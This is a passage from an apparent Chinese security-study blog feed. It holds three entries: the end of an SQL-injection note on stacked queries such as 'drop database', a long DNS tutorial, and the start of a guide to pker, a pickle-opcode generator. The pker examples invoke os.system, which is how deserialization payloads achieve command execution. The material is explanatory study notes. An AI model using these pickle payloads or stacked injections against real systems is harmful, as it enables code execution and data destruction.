id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>MySQL 语句中的 <code>;</code> 代表一个语句结束。如果 <code>;</code> 之后的语句也能执行，那么就可以拼接任意语句，包括<code>drop database</code>。</p><p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也是有可能的</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>sql注入</tag>
      
      <tag>盲注骚操作</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DNS</title>
    <link href="/2025/01/27/%E8%AE%BADNS/"/>
    <url>/2025/01/27/%E8%AE%BADNS/</url>
    
    <content type="html"><![CDATA[<h1 id="DNS的起源"><a href="#DNS的起源" class="headerlink" title="DNS的起源"></a>DNS的起源</h1><p>借助ai使用一个故事来解释DNS的起源：</p><h2 id="第一章：混乱的“电话簿”时代"><a href="#第一章：混乱的“电话簿”时代" class="headerlink" title="第一章：混乱的“电话簿”时代"></a><strong>第一章：混乱的“电话簿”时代</strong></h2><p>1980年代初，互联网还像一个刚刚兴起的小镇，名叫“阿帕镇”（ARPANET）。镇上的居民（计算机）虽然不多，但彼此通信全靠一本<strong>纸质电话簿</strong>——名为 <code>hosts.txt</code> 的文件。<br>这本电话簿由镇上的“管理员爷爷”（斯坦福研究院的SRI-NIC）手写维护，每新增一台设备，爷爷就得熬夜更新，再派人骑马送到每户人家。<br>可随着镇子扩大，问题来了：</p><ul><li>新住户暴增，电话簿越来越厚，骑马送书的速度赶不上变化。</li><li>有人家地址改了，邻居却还在用旧电话簿，信全寄丢了！</li><li>爷爷累倒了，全镇通信濒临瘫痪……</li></ul><hr><h2 id="第二章：天才少年的灵感"><a href="#第二章：天才少年的灵感" class="headerlink" title="第二章：天才少年的灵感"></a><strong>第二章：天才少年的灵感</strong></h2><p>一天，镇上的年轻工程师<strong>保罗·莫卡佩特里斯</strong>（Paul Mockapetris）在酒馆喝酒，听到有人抱怨：“要是电话簿能自动更新，还能分区域管理就好了！”<br>他灵光一闪，掏出一张皱巴巴的草纸，画下了一个<strong>分层地址系统</strong>的设计图：</p><ol><li><strong>总机（根服务器）</strong>：只记录每个“大区”的接线员是谁。</li><li><strong>区域分机（顶级域服务器）</strong>：比如 <code>.com</code> 区、<code>.edu</code> 区，负责管理下属街道。</li><li><strong>街道分机（权威服务器）</strong>：直接保管每户人家的最新地址。</li></ol><p>他兴奋地大喊：“不再需要一本大书！问路的人按层级查询，就像打电话转接分机！”</p><hr><h2 id="第三章：DNS系统的诞生"><a href="#第三章：DNS系统的诞生" class="headerlink" title="第三章：DNS系统的诞生"></a><strong>第三章：DNS系统的诞生</strong></h2><p>保罗连夜说服镇长（互联网工程组IETF），在小镇试点新系统——<strong>DNS（域名系统）</strong>。</p><ul><li><strong>域名</strong>：每户人家有了易记的名字，比如 <code>面包店.example.com</code>。</li><li><strong>解析流程</strong>：<ol><li>居民问总机：“<code>.com</code> 区谁管？”</li><li>总机回答：“去问 <code>.com</code> 区分机！”</li><li><code>.com</code> 区分机说：“<code>example.com</code> 街道归保罗家的服务器管！”</li><li>最终，保罗家的服务器给出“面包店”的IP地址：<code>192.0.2.1</code>。</li></ol></li></ul><p><strong>奇迹发生了</strong>：</p><ul><li>地址簿自动更新，再也不用全镇派送！</li><li>查询速度快如闪电，迷路的人越来越少。</li><li>小镇扩张成超级城市（互联网），DNS成了看不见的“导航员”。</li></ul><hr><h2 id="尾声：小镇的遗产"><a href="#尾声：小镇的遗产" class="headerlink" title="尾声：小镇的遗产"></a><strong>尾声：小镇的遗产</strong></h2><p>多年后，阿帕镇成了全球互联网，DNS系统默默支撑着亿万次查询。</p><ul><li><strong>根服务器</strong>像守护神，全球仅有13组（镜像遍布各地）。</li><li><strong>层级管理</strong>让每个社区（域名）自治，无需中央集权。</li><li>保罗的名字被刻在“互联网名人堂”，而那本旧电话簿，成了博物馆里的古董。</li></ul><hr><h2 id="隐喻解读"><a href="#隐喻解读" class="headerlink" title="隐喻解读"></a><strong>隐喻解读</strong></h2><ul><li><strong>电话簿</strong> <code>hosts.txt</code> → 早期静态主机文件</li><li><strong>总机→区域分机→街道分机</strong> → DNS根服务器→顶级域→权威服务器</li><li><strong>骑马送书</strong> → 手动更新主机文件的低效</li><li><strong>分层查询</strong> → DNS递归&#x2F;迭代解析流程</li></ul><p>在早期计算机系统的通信不便下，这便成就了DNS</p><h1 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h1><h2 id="区域"><a href="#区域" class="headerlink" title="区域"></a>区域</h2><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/20200914104025076.png" alt="20200914104025076"></p><p>其中顶级域（TLD）有 <code>arpa</code>、<code>com</code>、<code>edu</code>、<code>gov</code>…</p><p>顶级域分为两种类型：</p><ol><li><code>gTLDs</code>: <code>.com</code>、<code>.org</code> 等叫做<code>一般通用顶级域</code></li><li><code>ccTLDs</code>: <code>.cn</code>、<code>.jp</code> 等叫做<code>国家顶级域</code></li><li><code>arpa</code>：特殊域，比较特殊放在下面讲</li></ol><p>一个 DNS 子树（独立管理的）就称为一个<code>区域</code>，举个例子，比如 <code>sina.com.cn</code> 这个二级域，可以将它的区域划分为更小的区域，比如一般会根据用途来划分区域，假设 <code>blog.sina.com.cn</code> 为博客相关的域名等等。划分完子区域之后，需要经过父区域的授权，这样父区域遇到属于子区域下的域名，就会转给子区域来解析。</p><h3 id="查询方式"><a href="#查询方式" class="headerlink" title="查询方式"></a>查询方式</h3><p>在说流程之前，先说一下查询方式。很简单，分为 2 种：</p><ol><li>递归查询：A -&gt; B -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 帮 A 去 C 那里查找，拿到结果之后返回给 A，这个时候 A、B 各发起了一次解析请求。</li><li>迭代查询：A -&gt; B, A -&gt; C，A 向 B 发起 DNS 解析的请求之后，B 告诉 A 要去 C 那里查找，A 再向 C 发起 DNS 解析请求，这个时候 A 一共发起了两次解析请求，B 没有发起 DNS 解析请求。</li></ol><h2 id="Hosts-文件（静态-DNS-服务器）"><a href="#Hosts-文件（静态-DNS-服务器）" class="headerlink" title="Hosts 文件（静态 DNS 服务器）"></a>Hosts 文件（静态 DNS 服务器）</h2><p>在windows下的hosts文件存放在<code>C:\Windows\System32\drivers\etc\hosts</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Copyright (c) 1993-2009 Microsoft Corp.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This is a sample HOSTS file used by Microsoft TCP/IP for Windows.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This file contains the mappings of IP addresses to host names. Each</span><br><span class="hljs-comment"># entry should be kept on an individual line. The IP address should</span><br><span class="hljs-comment"># be placed in the first column followed by the corresponding host name.</span><br><span class="hljs-comment"># The IP address and the host name should be separated by at least one</span><br><span class="hljs-comment"># space.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Additionally, comments (such as these) may be inserted on individual</span><br><span class="hljs-comment"># lines or following the machine name denoted by a &#x27;#&#x27; symbol.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># For example:</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#      102.54.94.97     rhino.acme.com          # source server</span><br><span class="hljs-comment">#       38.25.63.10     x.acme.com              # x client host</span><br><br><span class="hljs-comment"># localhost name resolution is handled within DNS itself.</span><br><span class="hljs-comment">#127.0.0.1       localhost</span><br><span class="hljs-comment">#::1             localhost</span><br><span class="hljs-comment"># Added by Docker Desktop</span><br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> host.docker.internal<br><span class="hljs-attribute">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">100</span> gateway.docker.internal<br><span class="hljs-comment"># To allow the same kube context to work on the host and the container:</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> kubernetes.docker.internal<br><span class="hljs-comment"># End of section</span><br><span class="hljs-attribute">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span> localhost<br></code></pre></td></tr></table></figure><p>在linux下可以访问&#x2F;etc&#x2F;hosts查看</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs elixir"> cat /etc/hosts<br><span class="hljs-comment"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf: #使用的是wsl子系统</span><br><span class="hljs-comment"># [network]</span><br><span class="hljs-comment"># generateHosts = false</span><br><span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>       localhost<br><span class="hljs-number">127.0</span>.<span class="hljs-number">1.1</span>       <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span>.        <span class="hljs-title class_">DESKTOP</span>-<span class="hljs-title class_">D9FG48B</span><br><br><span class="hljs-comment"># The following lines are desirable for IPv6 capable hosts</span><br>::<span class="hljs-number">1</span>     ip6-localhost ip6-loopback<br>fe00::<span class="hljs-number">0</span> ip6-localnet<br>ff00::<span class="hljs-number">0</span> ip6-mcastprefix<br>ff02::<span class="hljs-number">1</span> ip6-allnodes<br>ff02::<span class="hljs-number">2</span> ip6-allrouters<br></code></pre></td></tr></table></figure><p>可以看见<code>127.0.01</code>被映射到<code>localhost</code> 其实访问<code>127.0.0.1</code>就是在房访问<code>localhost</code></p><p>Hosts 文件，可以直接理解为是本地静态的 DNS 服务器。需要解析 DNS 的时候，系统会首先自动从 Hosts 文件中寻找对应的 ip-域名 映射关系，一旦找到那么就完成解析了，如果没有找到，则继续解析流程。优先级高于网络DNS解析服务，所有可以加快域名解析、屏蔽垃圾网站、广告等等</p><h2 id="LocalDNS-服务器"><a href="#LocalDNS-服务器" class="headerlink" title="LocalDNS 服务器"></a>LocalDNS 服务器</h2><p>若 Hosts 文件中没有相关域名的记录，则来到了 LocalDNS。</p><p>在windows中，如果 <code>hosts</code> 文件中没有相关域名的记录，系统会依赖本地网络配置中的 DNS 服务器进行域名解析。Windows 的本地 DNS 配置存储在 <strong>网络适配器的设置中</strong>无法具体呈现，</p><p>但是在linux中可以看一下这个文件：<code>/etc/resolv.conf</code>:</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">cat</span> /etc/resolv.<span class="hljs-keyword">conf</span><br># This <span class="hljs-keyword">file</span> was automatically generated by WSL. To <span class="hljs-keyword">stop</span> automatic generation of this <span class="hljs-keyword">file</span>, <span class="hljs-built_in">add</span> the following entry <span class="hljs-keyword">to</span> /etc/wsl.<span class="hljs-keyword">conf</span>:<br># [network]<br># generateResolvConf = false<br>nameserver <span class="hljs-number">10</span>.xxx.xxx.xxx<br></code></pre></td></tr></table></figure><p>这个文件一般是自动生成的，什么时候生成的呢？DHCP(动态主机配置协议) 的时候。需要注意的是，这个文件里的 ip 经常是内网 ip，并且 LocalDNS 里面有个 “local”，大家可能会认为 LocalDNS 的服务器 ip 都是内网 ip，实际上也可以是外网 ip，比如其他组织提供的 DNS，像谷歌的<code>8.8.8.8</code>啦，国内的<code>114.114.114.114</code>啦。个人感觉是这些 DNS 的地址填写在我们本地的电脑或者移动设备上，所以称为 LocalDNS</p><p>需要注意的是，LocalDNS 本身不具备真正的解析域名的功能。它的作用有两个：</p><ol><li>代替用户的设备参与域名解析</li><li>缓存域名的查询记录，当其他设备发起相同的域名查询请求时可以直接返回查询结果，可以加快域名查询速度。</li></ol><p>用户设备 -&gt;检查hosts文件-&gt; LocalDNS 一般是递归查询，而 LocalDNS 发现它自己没有缓存对应的数据后，则需要向 DNS 根服务器发起查询请求，这个请求，一般是迭代查询。所以任何 LocalDNS 都需知道 DNS 根服务器的 ip 地址。</p><h2 id="DNS-根服务器"><a href="#DNS-根服务器" class="headerlink" title="DNS 根服务器"></a>DNS 根服务器</h2><p>DNS 根服务器（root name server），全球只有 <code>13</code> 个，编号从 <code>a.root-servers.net</code> 一直到 <code>m.root-servers.net</code>。之所以不说 13 台，是因为每个 DNS 根节点都会有多个服务器负责均衡查询（即任播节点），你可以在这个网站查询：<a href="https://root-servers.org/">https://root-servers.org/</a> 。</p><p>现在解析 DNS 的时候，已经不再需要知道 DNS 根服务器的真正的 ip 地址，只需要知道任播节点的ip地址就可以在世界各地与当地的最优节点进行通信了，所以现在大多数的 DNS 根服务器的 ip 地址都是任播节点 的 ip 地址。这样速度最快</p><p>所以，DNS 根服务器掌管着所有 <code>DNS 顶级域名服务器</code> 的地址，比如大家熟悉的 <code>.com</code>、<code>.org</code>、<code>.edu</code> 等等。假如我们查询的顶级域名是 <code>.com</code>，DNS 根服务器会将<code>.com</code> 顶级域名服务器的地址发回给 LocalDNS 服务器，让它自己去那里查。于是 LocalDNS 服务器再向手握 <code>.com</code> 的 DNS 顶级域名服务器发起查询</p><h2 id="DNS-顶级域名服务器"><a href="#DNS-顶级域名服务器" class="headerlink" title="DNS 顶级域名服务器"></a>DNS 顶级域名服务器</h2><p>手握 <code>.com</code> 的 DNS 顶级域名服务器一看来源的查询是 <code>xxx.com</code>，按理来说应该可以找到对应的 ip 并直接返回了。但是现在基本上都是授权给其他厂家去做的，被授权的叫<code>DNS 权威域名服务器</code>，或者企业自建的 DNS 服务器。举个例子，解析一下<code>baidu.com</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">~$ dig baidu.com<br><br>; &lt;&lt;&gt;&gt; DiG 9.18.30-0ubuntu0.24.04.1-Ubuntu &lt;&lt;&gt;&gt; baidu.com<br>;; global options: +cmd<br>;; Got answer:<br>;; -&gt;&gt;HEADER&lt;&lt;- <span class="hljs-string">opcode: QUERY, status: NOERROR, id: 46978</span><br><span class="hljs-string">;; flags: qr aa rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; OPT PSEUDOSECTION:</span><br><span class="hljs-string">; EDNS: version: 0, flags:; MBZ: 0x0001, udp: 1232</span><br><span class="hljs-string">;; QUESTION SECTION:</span><br><span class="hljs-string">;baidu.com.                     IN      A</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; ANSWER SECTION:</span><br><span class="hljs-string">baidu.com.              1       IN      A       198.18.0.6</span><br><span class="hljs-string"></span><br><span class="hljs-string">;; Query time: 0 msec</span><br><span class="hljs-string">;; SERVER: 10.255.255.254#53(10.255.255.254) (UDP)</span><br><span class="hljs-string">;; WHEN: Mon Jan 27 18:59:34 CST 2025</span><br><span class="hljs-string">;; MSG SIZE  rcvd: 54</span><br></code></pre></td></tr></table></figure><p>这里表示查询首先经过了<code>10.255.255.254</code>（本地的localDNS）设置的DNS解析地址,如果本地没有对应的缓存记录,他就会发起递归查询，首先向<strong>最近的传播节点</strong>查询<code>baidu.com</code>的顶级域名服务器（<code>.com</code> 的权威服务器）。节点会返回 <code>.com</code> 的权威服务器地址。LocalDNS 再向 <code>.com</code> 的权威服务器查询 <code>baidu.com</code> 的权威服务器。<code>.com</code> 的权威服务器返回 <code>baidu.com</code> 的权威域名服务器地址,LocalDNS 最终向 <code>dns.baidu.com</code> 查询，获取到实际的ip地址，</p><p>这个时候 LocalDNS 服务器就会缓存 <code>baidu.com</code> 的 DNS 权威域名服务器，免得下次查的时候还得再走一遍之前的流程（当然是在缓存未过期的情况下）。</p><h2 id="DNS-权威域名服务器"><a href="#DNS-权威域名服务器" class="headerlink" title="DNS 权威域名服务器"></a>DNS 权威域名服务器</h2><p>DNS 权威域名服务器要提前申请 DNS 解析授权，这类 DNS 域名服务器一般掌管着特定域下所有的子域和主机，比如它不仅知道 <code>baidu.com</code> 的 ip，同样也知道 <code>www.baidu.com</code> 的 ip。所以它可以直接返回结果，这一步没啥好说的。</p><p>同样， LocalDNS 服务器也会缓存 <code>baidu.com</code> 的 ip，免得下次查的时候还得再走一遍之前的流程（当然也是在缓存未过期的情况下）。</p><p>各大公司一般都有自己的权威域名服务器，自己维护 DNS，好处有很多，比如：</p><ol><li>方便管理。假如不自己维护域名信息，域名生效时间和缓存时间都是不可控的，而自己搭建可以避免这些问题。</li><li>动态管理。比如通过一些软件来更新自己的 DNS 信息更方便，还可以做动态域名解析。</li></ol><h3 id="流程总结"><a href="#流程总结" class="headerlink" title="流程总结"></a>流程总结</h3><p>（以下流程以 A 记录(表示该域名解析到的 IP 地址)为例）</p><ol><li>设备 -&gt; LocalDNS 服务器（递归查询）</li><li>LocalDNS 服务器 -&gt; DNS 根服务器或者最近的传播节点（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 根服务器或者最近的传播节点（返回顶级域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 顶级域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 顶级域名服务器（返回权威域名服务器的地址）</li><li>LocalDNS 服务器 -&gt; DNS 权威域名服务器（迭代查询）</li><li>LocalDNS 服务器 &lt;- DNS 权威域名服务器（返回 ip）</li><li>设备 &lt;- LocalDNS 服务器（返回 ip）</li></ol><h2 id="DNS-的几个重要概念"><a href="#DNS-的几个重要概念" class="headerlink" title="DNS 的几个重要概念"></a>DNS 的几个重要概念</h2><h3 id="DNS-资源记录（Resource-Record-RR）"><a href="#DNS-资源记录（Resource-Record-RR）" class="headerlink" title="DNS 资源记录（Resource Record, RR）"></a>DNS 资源记录（Resource Record, RR）</h3><p>DNS 服务器有自己的域文件（zone file），zone file 是由多个记录组成的，每一个记录就被称为资源记录。</p><p>假如你买了一个域名，需要绑定到对应的 ip 上来提供 web 服务，或者要提供其他服务，这个时候域名的销售方会让你选择解析的类型，常见的有以下几种：</p><ol><li><code>A</code> 记录：将域名指向一个 IPv4 地址（例如：100.100.100.100）最常用的</li><li><code>CNAME</code> 记录：将域名指向一个域名，实现与被指向域名相同的访问效果，可以简单地理解为域名的别名。比如 <code>www.baidu.com</code> 就是 cname 到 <code>baidu.com</code> 上，然后 <code>baidu.com</code> 是有自己的 A 记录的，这样有个好处就是假如有很多个域名，<code>a.baidu.com</code>、<code>b.baidu.com</code>…，但是 ip 只有 1 个，如果不用 cname，当这个 ip 变更的时候，每个与此 ip 绑定的域名都要去改 A 记录；用了 cname 之后，只需要改 cname 的域名（<code>baidu.com</code>）的 A 记录即可。（CDN 加速应该就是这样做的对吧~）</li><li><code>MX</code> 记录：指向电子邮件服务器地址，一般会根据邮箱服务商提供的 MX 记录填写此记录。</li><li><code>NS</code> 记录：权威域名服务器记录，即将某些域名指定让某个 DNS 域名服务器来解析。需要注意的是，只有顶级域名（或者说一级域名）才有 ns 记录，比如 <code>www.weibo.com</code> 是没有 ns 记录的。</li><li><code>TXT</code> 记录：可任意填写、可为空。一般做一些验证记录时会使用此项，例如：SPF 记录（用于反垃圾邮件）</li><li><code>AAAA</code> 记录：将域名指向一个 IPv6 地址（例如：ff03:0:0:0:0:0:0:c1）</li><li><code>SOA</code> 记录：SOA（Start of Authority）叫做起始授权机构记录。通俗地来讲，一个域名可能有很多个 NS 记录，因为会有多台服务器在进行解析（负责均衡或者备份），但哪一个才是主 DNS 权威服务器呢？这个就要看 SOA 记录了，它说明了在众多 NS 记录里哪一台才是主 DNS 权威服务器。这个主 DNS 权威服务器会负责其他事情，比如告诉其他 NS 权威服务器什么时候该更新数据（通过域传送的方式，下面会讲），甚至记录里还有对应联系人的邮件、TTL 等信息，这里就不多赘述了。</li><li><code>PTR</code> 记录：PTR 记录是 A 记录的逆向记录，负责将 IP 反向解析为域名，这个内容稍多，单独放在下面讲</li><li><code>AXFR</code>、<code>IXFR</code> 记录：涉及区域传送，单独放在下面讲</li></ol><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250127192139251.png" alt="image-20250127192139251"></p><h3 id="FQDN"><a href="#FQDN" class="headerlink" title="FQDN"></a>FQDN</h3><p><strong>FQDN</strong>（Fully Qualified Domain Name，完全限定域名）是指在域名系统（DNS）中一个完整的、唯一的域名，用来精确标识互联网上的一个主机或服务的位置。</p><h4 id="FQDN-的特点："><a href="#FQDN-的特点：" class="headerlink" title="FQDN 的特点："></a><strong>FQDN 的特点：</strong></h4><ol><li><strong>完整性：</strong><ul><li>FQDN 包括主机名（如 <code>www</code>）和域名（如 <code>example.com</code>）。</li><li>必须包含顶级域名（如 <code>.com</code>、<code>.org</code> 等），并最终以一个点（<code>.</code>）结尾（在技术上，最后的点表示 DNS 根）。</li></ul></li><li><strong>唯一性：</strong><ul><li>FQDN 是全球唯一的，它能在整个互联网中唯一标识一台设备或服务。</li><li>每个 FQDN 都指向一个特定的 IP 地址（通过 DNS 解析）。</li></ul></li><li><strong>结构</strong><ul><li>&lt;主机名&gt;.&lt;子域名&gt;.&lt;二级域名&gt;.&lt;顶级域名&gt;.</li></ul></li><li><strong>用途</strong><ul><li>HTTPS 证书（SSL&#x2F;TLS）通常绑定到 FQDN，确保通信的安全性和唯一性。</li><li>在配置邮件服务器、SSH 服务等网络服务时，通常需要填写 FQDN 以确保服务可以被正确识别</li></ul></li></ol><h3 id="DDNS"><a href="#DDNS" class="headerlink" title="DDNS"></a>DDNS</h3><p><code>DDNS</code>比<code>DNS</code>多了一个D多的就是一个<code>dynamic(动态的)</code></p><p><code>DDNS</code>是一种域名解析服务，用来将动态变化的 IP 地址实时更新到域名解析记录中，从而让用户能够通过固定的域名访问 IP 地址不断变化的设备。</p><h2 id="Non-authoritative-answer"><a href="#Non-authoritative-answer" class="headerlink" title="Non-authoritative answer"></a>Non-authoritative answer</h2><p>这个意思就是这个解析记录是从 LocalDNS 的缓存里拿来的，而不是向真正负责这个域名的 DNS 权威服务器拿来的</p><h2 id="DNS-区域传送"><a href="#DNS-区域传送" class="headerlink" title="DNS 区域传送"></a>DNS 区域传送</h2><p>是一种用于在 DNS 服务器之间复制 DNS 区域数据的机制，其目的是确保多个 DNS 服务器中存储的域名解析记录保持一致。这种机制通常在主从 DNS 服务器之间使用,DNS区域传送有两种方式：</p><ol><li><code>axfr</code>：完整区域传送</li><li><code>ixfr</code>：增量区域传送</li></ol><p>所以，正常情况下 DNS 区域传送操作只有经过授权的 DNS 服务器才有权执行，但许多 DNS 服务器却被错误地配置成只要有人发出请求，就直接提供一个 zone 的 DNS 内容。DNS 域传送漏洞会在下一篇详细介绍，这个手段是前些年用于信息收集的手段之一。</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DNS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pker</title>
    <link href="/2025/01/26/pker/"/>
    <url>/2025/01/26/pker/</url>
    
    <content type="html"><![CDATA[<h1 id="pker"><a href="#pker" class="headerlink" title="pker"></a>pker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul><li>pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在<a href="https://github.com/eddieivan01/pker%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81%E3%80%82">https://github.com/eddieivan01/pker下载源码。</a></li><li>使用pker，我们可以更方便地编写pickle opcode（生成pickle版本0的opcode）。</li><li>再次建议，在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。</li></ul><h2 id="pker能做的事"><a href="#pker能做的事" class="headerlink" title="pker能做的事"></a>pker能做的事</h2><blockquote><ul><li>变量赋值：存到memo中，保存memo下标和变量名即可</li><li>函数调用</li><li>类型字面量构造</li><li>list和dict成员修改</li><li>对象成员变量修改</li></ul></blockquote><p>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。</p><h2 id="使用方法与示例"><a href="#使用方法与示例" class="headerlink" title="使用方法与示例"></a>使用方法与示例</h2><ol><li>pker中的针对pickle的特殊语法需要重点掌握</li><li>此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。</li><li>pker主要用到<code>GLOBAL、INST、OBJ</code>三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs sql">以下<span class="hljs-keyword">module</span>都可以是包含`.`的子<span class="hljs-keyword">module</span><br>调用函数时，注意传入的参数类型要和示例一致<br>对应的opcode会被生成，但并不与pker代码相互等价<br><br><span class="hljs-keyword">GLOBAL</span><br>对应opcode：b<span class="hljs-string">&#x27;c&#x27;</span><br>获取<span class="hljs-keyword">module</span>下的一个全局对象（没有import的也可以，比如下面的os）：<br><span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>)<br>输入：<span class="hljs-keyword">module</span>,instance(callable、<span class="hljs-keyword">module</span>都是instance)  <br><br>INST<br>对应opcode：b<span class="hljs-string">&#x27;i&#x27;</span><br>建立并入栈一个对象（可以执行一个函数）：<br>INST(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>, <span class="hljs-string">&#x27;ls&#x27;</span>)  <br>输入：<span class="hljs-keyword">module</span>,callable,para <br><br>OBJ<br>对应opcode：b<span class="hljs-string">&#x27;o&#x27;</span><br>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：<br>OBJ(<span class="hljs-keyword">GLOBAL</span>(<span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;system&#x27;</span>), <span class="hljs-string">&#x27;ls&#x27;</span>) <br>输入：callable,para<br><br>xxx(xx,...)<br>对应opcode：b<span class="hljs-string">&#x27;R&#x27;</span><br>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）<br><br>li[<span class="hljs-number">0</span>]<span class="hljs-operator">=</span><span class="hljs-number">321</span><br>或<br>globals_dic[<span class="hljs-string">&#x27;local_var&#x27;</span>]<span class="hljs-operator">=</span><span class="hljs-string">&#x27;hello&#x27;</span><br>对应opcode：b<span class="hljs-string">&#x27;s&#x27;</span><br>更新列表或字典的某项的值<br><br>xx.attr<span class="hljs-operator">=</span><span class="hljs-number">123</span><br>对应opcode：b<span class="hljs-string">&#x27;b&#x27;</span><br>对xx对象进行属性设置<br><br><span class="hljs-keyword">return</span><br>对应opcode：b<span class="hljs-string">&#x27;0&#x27;</span><br>出栈（作为pickle.loads函数的返回值）：<br><span class="hljs-keyword">return</span> xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）<br></code></pre></td></tr></table></figure><p>注意：</p><ol><li>由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为<strong>左值</strong>，需要索引时只能先获取相应的函数（如<code>getattr</code>、<code>dict.get</code>）才能进行。但是因为存在<code>s</code>、<code>u</code>、<code>b</code>操作符，<strong>作为右值是可以的</strong>。即“查值不行，赋值可以”。</li><li>pker解析<code>S</code>时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">test</span>=<span class="hljs-string">&quot;123&quot;</span><br><span 